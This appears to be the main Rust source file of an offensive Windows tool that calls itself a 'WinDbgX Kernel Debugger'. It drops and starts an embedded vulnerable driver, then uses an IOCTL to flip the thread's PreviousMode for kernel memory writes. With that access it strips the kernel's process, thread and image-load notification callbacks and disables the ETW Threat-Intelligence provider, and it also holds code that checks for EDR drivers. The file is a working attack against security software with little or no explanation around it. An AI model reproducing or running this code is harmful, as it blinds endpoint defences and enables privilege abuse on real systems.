use std::{thread, time};
use std::ffi::{c_void};

mod utils;
mod svc;
mod pdb_utils;
mod km_utils;
mod xp_utils;
mod mem;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[+] =-=-=- WinDbgX Kernel Debugger -=-=-=");
    // Sleeping...
    //   - TKTK: do custom sleep that checks for PPID and/or checks for a specific cadence
    println!("[*] Waiting for the opportune moment...\n");
    let bo_do_bleep = time::Duration::from_millis(100);
    thread::sleep(bo_do_bleep);

    // -=-= Doing setup =-=- //

    // Get the Windows version
    println!("[>] Setting up the environment...");
    let version = utils::get_windows_version_simple();
    println!("[|] Detected OS: {}", version);

    // Get symbol files
    let ntos: String = "C:\\Windows\\System32\\ntoskrnl.exe".to_string();
    let fltmgr: String = "C:\\Windows\\System32\\drivers\\fltmgr.sys".to_string();
    
    let nt_url = match pdb_utils::pdb_symbol_url(ntos) {
        Ok(url) => url,
        Err(e) => {
            eprintln!("[!] Failed to get PDB URL for NTOS: {}", e);
            std::process::exit(1);
        }
    };
    let fltmgr_url = match pdb_utils::pdb_symbol_url(fltmgr) {
        Ok(url) => url,
        Err(e) => {
            eprintln!("[!] Failed to get PDB URL for FLTMGR: {}", e);
            std::process::exit(-1);
        }
    };

    println!("[>] Symbols download URLs:");
    println!("[|]   {}", nt_url);
    println!("[|]   {}", fltmgr_url);
    
    // Download symbol files
    let mut nt_pdb = utils::download_pdb(&nt_url)?;
    let fm_pdb = utils::download_pdb(&fltmgr_url)?;

    // Parse symbol files for offsets
    let nt_offsets;
    match pdb_utils::get_nt_offsets(&mut nt_pdb) {
        Ok(offsets) => {
            println!("[+] Got NT offsets for this version...game on :D");
            nt_offsets = offsets; // bind to outer var
        }
        Err(e) => {
            eprintln!("[-] Failed to parse NT offsets: {}", e);
            std::process::exit(-1);
        }
    }

    // Get base addresses for target kernel modules
    let nt_base;
    let fm_base;
    match km_utils::get_driver_base("ntoskrnl.exe") {
        Some(base) => {
            println!("[+] NT base address: {:?}", base);
            nt_base = base;
        },
        None => {
            println!("[!] Could not find base address for ntoskrnl.exe!");
            println!("[-] Tool must be run from Medium integrity on versions before 24H2, or High integrity on 24H2+. (PS, try running from PowerShell...)");
            std::process::exit(-1);
        }
    }
    match km_utils::get_driver_base("fltmgr.sys") {
        Some(base) => {
            println!("[+] FM base address: {:?}", base);
            fm_base = base;
        },
        None => {
            println!("[!] Could not find base address for fltmgr.sys!");
            println!("[-] Tool must be run from Medium integrity on versions before 24H2, or High integrity on 24H2+. (PS, try running from PowerShell...)");
            std::process::exit(-1);
        }
    }


    /* -=-= TESTING: Checking the module base address for driver name + if matching EDR
    let addr: u64 = 0xfffff807200581e0;
    if let Some(driver_name) = km_utils::find_driver_name_from_addr(addr) {
        let is_edr: bool = km_utils::is_driver_name_matching_edr(&driver_name);
        println!("[*] Address 0x{:016x}: {} [EDR? {}]", addr, driver_name, is_edr);   
    }

    // =-=- TESTING: Check the loaded DLLs in a process
    let target_pid: DWORD = 11212;
    if utils::is_edr_dll_loaded(target_pid) {
        println!("[*] EDR DLL detected in process {}", target_pid);
    } else {
        println!("[-] No suspicious EDR DLLs found in process {}", target_pid);
    }
    */
    svc::write_embedded_file("C:\\um_pass.sys")?;
    
    // Get a handle to the vuln driver
    let h_drv;
    match xp_utils::get_driver_handle() {
        Ok(_handle) => { }
        Err(err) => {
            eprintln!("[-] Could not get handle, error: {}. Need to download...", err);
            let svc_name = "umpass";
            let bin_path = r"\\??\\C:\\um_pass.sys"; // escaped backslashes
            svc::write_embedded_file("C:\\um_pass.sys")?;
            // Try modifying the registry first
            svc::modify_svc_reg(svc_name, bin_path)
                .expect("[!] Failed to modify service registry");
            // If registry modification succeeds, start the service
            svc::start_svc(svc_name)
                .expect("[!] Failed to start service");
        }
    }
    match xp_utils::get_driver_handle() {
        Ok(handle) => {
            h_drv = handle;
        }
        Err(err) => {
            eprintln!("[-] Could not get handle, error: {}. Did not start service...exiting.", err);
            std::process::exit(-1);
        }
    }
    println!("[+] Got driver handle: {:?}", h_drv);

    // Get KTHREAD and then KTHREAD.PreviousMode
    let thread_addr: Option<*mut c_void> = km_utils::get_thread_info();
    let mut pm: Option<*mut u8> = None;

    if let Some(ptr) = thread_addr {
        let addr = ptr as usize;
        let pm_offset = nt_offsets.modus_previosa as usize;
        pm = Some((addr + pm_offset) as *mut u8);

        println!("[*] Thread pointer: {:p}", ptr);
        println!("[+] Pointer to modus previosa of our thread: {:p}", pm.unwrap());
    } else {
        println!("[!] Failed to get thread info");
        std::process::exit(-1);
    }

    println!("[>] Modus Previosa modification...");
    unsafe {
        xp_utils::send_ioctl_to_driver(
            h_drv,
            pm.unwrap() as usize as u64,
            0x1,
        );
    }

    // =-=-> Remove Process Creation Notification callback
    println!("[>] Removing notification callbacks:");
    let process_create_notify_base = {
        (nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)
    };
    let thread_create_notify_base = {
        (nt_base as u64).wrapping_add(nt_offsets.psp_create_thread_notify_routine as u64)
    };
    let img_load_notify_base = {
        (nt_base as u64).wrapping_add(nt_offsets.psp_load_image_notify_routine as u64)
    };
    
    match xp_utils::nerf_cb(
        process_create_notify_base, 
        "PspCreateProcessNotifyRoutine"
    ) {
        Ok(_val) => {},
        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
    }
    match xp_utils::nerf_cb(thread_create_notify_base, "PspCreateThreadNotifyRoutine") {
        Ok(_val) => {},
        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
    }
    match xp_utils::nerf_cb(img_load_notify_base, "PspLoadImageNotifyRoutine") {
        Ok(_val) => {},
        Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
    }


    // =-=-> Disable Etw-Ti provider
    let ti_handle = {
        (nt_base as u64).wrapping_add(nt_offsets.threat_int_prov_reg_handle as u64)
    };
    match xp_utils::nerf_etw_prov(
        ti_handle, 
        "Etw-Ti", 
        nt_offsets.guid_entry, 
        nt_offsets.prov_enable_info) 
        {
        Ok(val) => println!("[|] Provider completed: 0x{:X}", val),
        Err(e) => eprintln!("[-] Failed to read: {:?}", e),
    }




    // Clean up: Write 0x1 back to PM. Can't read it again! :D
    mem::write_byte(pm.unwrap() as usize as u64, 0x1);

    // Pause & exit
    println!("");
    Ok(())
}

